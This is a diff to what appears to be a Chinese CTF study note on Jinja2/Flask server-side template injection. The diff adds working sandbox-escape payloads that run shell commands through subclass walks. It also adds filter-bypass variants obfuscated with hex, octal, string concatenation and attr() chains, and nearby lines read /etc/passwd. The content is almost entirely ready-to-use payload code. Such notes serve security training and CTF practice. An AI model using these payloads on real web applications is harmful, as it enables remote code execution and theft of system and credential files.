@@ -185,6 +185,7 @@ get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
 # 通过 system 执行任意命令
 ''.__class__.__base__.__subclasses__()[80].__init__.__globals__["sys"].modules["os"].system("whoami")
 # 通过 popen 执行任意命令
+{{''.__class__.__mro__[-1].__subclasses__()[298]('cat /flag',shell=True,stdout=-1).communicate()[0].strip()}}
 ().__class__.__bases__[0].__subclasses__()[80].__init__.__globals__['__builtins__']['__import__']('os').system('ls')
 ().__class__.__bases__[0].__subclasses__()[80].__init__.__globals__['__builtins__']['__import__']('os').popen('cat /etc/passwd').read()
 ().__class__.__bases__[0].__subclasses__()[80].__init__.['__builtins__']['__import__']('subprocess').Popen(['cat', '/etc/passwd']).read()
@@ -198,6 +199,17 @@ get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
 
 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{% for b in c.__init__.__globals__.values() %} {% if b.__class__ == {}.__class__ %}{% if 'eval' in b.keys() %}{{ b['eval']('__import__("os").popen("id").read()') }}{% endif %}{% endif %}{% endfor %} {% endif %}{% endfor %}
 
+{% for x in ().__class__.__base__.__subclasses__() %}
+    {% if "warning" in x.__name__ %}
+        {{x()._module.__builtins__['__import__']('os').popen("ls").read()}}
+    {%endif%}
+{%endfor%}
+# python2 decode hex
+{% for a in []["5F5F636C6173735F5F"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]["5F5F626173655F5F"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]["5F5F737562636C61737365735F5F"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]() %}
+    {% if "7761726E696E67"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78") in a["5F5F6E616D655F5F"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")] %}
+        {{a()["5F6D6F64756C65"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]["5F5F6275696C74696E735F5F"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]["5F5F696D706F72745F5F"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]("6F73"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78"))["706F70656E"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]("6563686F2024666C6167"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78"))["72656164"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]()}}
+    {%endif%}
+{%endfor%}
 ```
 ## **花式绕过总结**
 
@@ -216,6 +228,8 @@ get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
 {{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(64)|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("cat /flag").read()')}}
 {{''['__class__']['__mro__'][-1]['__subclasses__']()[65]['__init__']['__globals__']['__builtins__']['__import__']('os')['popen']('cat /flag')['read']()}}
 {{ ''['__class__']['__base__']['__subclasses__']()[96]['__subclasses__']()[0]['__subclasses__']()[0]('/flag').read() }}
+getattr(getattr(getattr(getattr(getattr(getattr(getattr([],'__cla'+'ss__'),'__mr'+'o__')[1],'__subclas'+'ses__')()[104],'__init__'),'__glob'+'al'+'s__')['sy'+'s'],'mod'+'ules')['o'+'s'],'sy'+'ste'+'m')('l'+'s')
+
 ```
 ### 绕过[]
 ```python
@@ -319,8 +333,13 @@ __getattribute__使用实例访问属性时,调用该方法
 ```python
 同样利用`request.args`属性
 {{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&class=__class__&mro=__mro__&subclasses=__subclasses__
-
 题目练习：文尾参考3中的*QCTF-Confustion1*
+```
+```python
+{{''["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fmro\x5f\x5f"][1]["\x5f\x5fsubclasses\x5f\x5f"]()[64]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]('os')["popen"]("ls")["read"]()}}
+
+{%print%0a(lipsum|attr("\137\137\147\154\157\142\141\154\163\137\137"))|attr("\137\137\147\145\164\151\164\145\155\137\137")("\137\137\142\165\151\154\164\151\156\163\137\137")|attr("\137\137\147\145\164\151\164\145\155\137\137")("\145\166\141\154")("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\160\157\160\145\156\50\47\143\141\164\40\57\146\154\141\147\47\51\56\162\145\141\144\50\51")%}
+
 ```
 ### 过滤{{
 ```python
